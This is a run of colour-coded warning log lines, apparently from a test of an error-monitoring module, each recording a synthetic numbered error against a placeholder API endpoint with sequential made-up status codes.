WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.851940Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3058'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.851989Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3059'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.852043Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3060'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.852094Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3061'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.852145Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3062'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.852214Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3063'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.852307Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3064'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.852369Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3065'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.852423Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3066'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.852474Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3067'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.852523Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3068'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.852572Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3069'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.852621Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3070'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.852670Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3071'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.852717Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3072'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.852765Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3073'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.852815Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3074'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.852869Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3075'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.852922Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3076'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.852974Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3077'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.853024Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3078'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.853073Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3079'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.853122Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3080'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.853172Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3081'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.853222Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3082'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.853271Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3083'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.853320Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3084'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.853369Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3085'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.853418Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3086'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.853468Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3087'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.853516Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3088'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.853564Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3089'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.853613Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3090'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.853661Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3091'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.853709Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3092'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.853758Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3093'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.853806Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3094'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.853853Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3095'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.853904Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3096'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.853952Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3097'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
